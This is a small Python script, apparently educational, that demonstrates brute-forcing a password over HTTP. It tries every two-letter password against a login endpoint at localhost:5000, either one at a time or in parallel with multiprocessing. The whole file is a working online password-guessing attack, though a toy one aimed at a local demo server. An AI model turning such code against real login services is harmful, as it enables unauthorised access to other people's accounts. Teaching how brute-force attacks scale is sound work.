######################################################
# Title: client
# Description: A simple bruteforce client meant to demonstrate the difference between bruteforcing with a sequentiel attacks and parallel attacks.
# Author: Tarllark
######################################################

from multiprocessing import Pool, cpu_count
import requests as req
import string


def genPSW(dataset = [i for i in string.ascii_letters]):
	for i in dataset:
		for f in dataset:
			password = i+f
			yield password

def attempt(psw = '', url = 'http://localhost:5000/'):
	response = req.post(url, json={"password":psw})
	res = '';
	if response.status_code == 200:
		res = 'The password is: ' + psw
		return res
	else:
		return
	
def sequentielAttack(dataset = [i for i in genPSW()]):
	for password in dataset:
		result = attempt(psw = password)
		if result:
			print(result)
			#break;

def parallelAttack(dataset = [i for i in genPSW()], workers = cpu_count()):
	with Pool(processes=workers) as p:
		res = p.map(attempt, dataset)
	for i in res:
		if i != None:
			print(i)
		
if __name__ == '__main__':		
	sequentielAttack()
	#parallelAttack()